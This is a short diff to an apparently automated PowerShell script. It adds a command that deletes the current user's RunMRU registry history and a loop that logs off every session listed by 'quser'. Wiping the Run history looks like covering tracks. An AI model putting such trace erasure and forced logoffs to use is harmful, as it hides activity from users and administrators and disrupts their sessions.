@@ -16,3 +16,9 @@ while ($sw.elapsed -lt $timeout){
 }
 $x = New-Object -ComObject Shell.Application
 $x.minimizeall()
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+quser | Select-Object -Skip 1 | ForEach-Object {
+$CurrentLine = $_.Trim() -Replace '\s+', ' ' -Split '\s'
+$UserID = $CurrentLine[2]
+logoff $UserID
+}
